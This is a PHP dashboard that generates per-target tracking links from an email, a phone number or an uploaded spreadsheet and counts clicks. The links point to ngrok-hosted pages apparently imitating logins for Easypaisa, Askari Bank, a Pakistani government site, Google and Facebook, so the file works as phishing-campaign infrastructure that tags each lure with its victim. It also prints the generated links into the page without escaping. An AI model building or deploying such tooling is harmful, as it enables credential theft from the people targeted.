<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['group_name'])) {
        $_SESSION['group_name'] = $_POST['group_name'];
    }
    if (isset($_POST['contact'])) {
        $_SESSION['contact'] = $_POST['contact'];
    }
}

$groupName = isset($_SESSION['group_name']) ? $_SESSION['group_name'] : '';
$contact = isset($_SESSION['contact']) ? $_SESSION['contact'] : '';

function encryptData($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data)); // URL-safe encoding
}

$base_links = [
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
    "https://8671-103-137-24-144.ngrok-free.app/google/googlei.php",
    "https://8671-103-137-24-144.ngrok-free.app/real-Estate-Management-System-main/",
    "https://8671-103-137-24-144.ngrok-free.app/facebook/facebook_login.php",
    "https://8671-103-137-24-144.ngrok-free.app/warZoneCommand/index.php",
    "https://8671-103-137-24-144.ngrok-free.app/hackathon/index.html#about",
    "https://8671-103-137-24-144.ngrok-free.app/eshop2",
    "https://8671-103-137-24-144.ngrok-free.app/stylo_website/welcome_stylo.php"
];

if ($contact) {
    $encryptedContact = encryptData($contact);
    
    // **Fix: Clear previous generated links before adding new ones**
    $_SESSION['generated_links'] = [];

    $_SESSION['generated_links'] = array_map(function($link) use ($encryptedContact) {
        return "track_click.php?url=" . urlencode($link) . "&contact=" . urlencode($encryptedContact);
    }, $base_links);
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Group Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="container mt-4">
    <h2 class="text-center">Group Dashboard</h2>
    
    <form method="POST" class="mb-3" id="groupForm">
        <div class="mb-3">
            <label for="group_name" class="form-label">Enter Group Name:</label>
            <input type="text" id="group_name" name="group_name" class="form-control" required value="<?php echo htmlspecialchars($groupName); ?>">
        </div>
        <button type="submit" class="btn btn-primary">Save Group</button>
    </form>
    
    <?php if ($groupName): ?>
        <h3>Group: <?php echo htmlspecialchars($groupName); ?></h3>
        
        <form method="POST" class="mb-3" id="contactForm">
            <div class="mb-3">
                <label for="contact" class="form-label">Enter Email or Phone:</label>
                <input type="text" id="contact" name="contact" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-success">Generate Links</button>
        </form>
        
        <form method="POST" action="upload_excel.php" enctype="multipart/form-data" id="uploadForm">
            <div class="mb-3">
                <label for="excel_file" class="form-label">Upload Excel File:</label>
                <input type="file" id="excel_file" name="excel_file" class="form-control" accept=".xls,.xlsx" required>
            </div>
            <button type="submit" class="btn btn-warning">Upload & Generate Links</button>
        </form>

        <h3 class="text-center mt-4">Click Statistics</h3>

        <!-- Bar Chart -->
        <canvas id="clickChart"></canvas>

        <!-- Table -->
        <h3 class="text-center mt-4">Detailed Click Report</h3>
        <table class="table table-bordered mt-3">
            <thead>
                <tr>
                    <th>Website Name</th>
                    <th>Number of Clicks</th>
                </tr>
            </thead>
            <tbody id="clickTableBody"></tbody>
        </table>

        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <script>
            fetch('fetch_clicks.php')
                .then(response => response.json())
                .then(data => {
                    const labels = data.map(item => item.website);
                    const clicks = data.map(item => item.click_count);

                    // Update Chart
                    const ctx = document.getElementById('clickChart').getContext('2d');
                    new Chart(ctx, {
                        type: 'bar',
                        data: {
                            labels: labels,
                            datasets: [{
                                label: 'Number of Clicks',
                                data: clicks,
                                backgroundColor: ['red', 'blue', 'green', 'purple', 'orange', 'yellow', 'pink', 'cyan', 'brown', 'gray'],
                                borderColor: 'black',
                                borderWidth: 1
                            }]
                        },
                        options: {
                            responsive: true,
                            scales: {
                                y: {
                                    beginAtZero: true,
                                    ticks: { stepSize: 1 }
                                }
                            }
                        }
                    });

                    // Update Table
                    const tableBody = document.getElementById("clickTableBody");
                    data.forEach(item => {
                        const row = `<tr>
                            <td>${item.website}</td>
                            <td>${item.click_count}</td>
                        </tr>`;
                        tableBody.innerHTML += row;
                    });
                });

            // **Fix: Prevent multiple submissions**
            document.getElementById("contactForm").addEventListener("submit", function() {
                this.querySelector("button[type='submit']").disabled = true;
            });
            document.getElementById("uploadForm").addEventListener("submit", function() {
                this.querySelector("button[type='submit']").disabled = true;
            });
        </script>

        <?php if (isset($_SESSION['generated_links'])): ?>
            <h4>Generated Links for Group: <?php echo htmlspecialchars($groupName); ?></h4>
            <ul>
                <?php foreach ($_SESSION['generated_links'] as $link): ?>
                    <li><a href="<?php echo $link; ?>" target="_blank"><?php echo $link; ?></a></li>
                <?php endforeach; ?>
            </ul>
            <?php unset($_SESSION['generated_links']); ?>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>
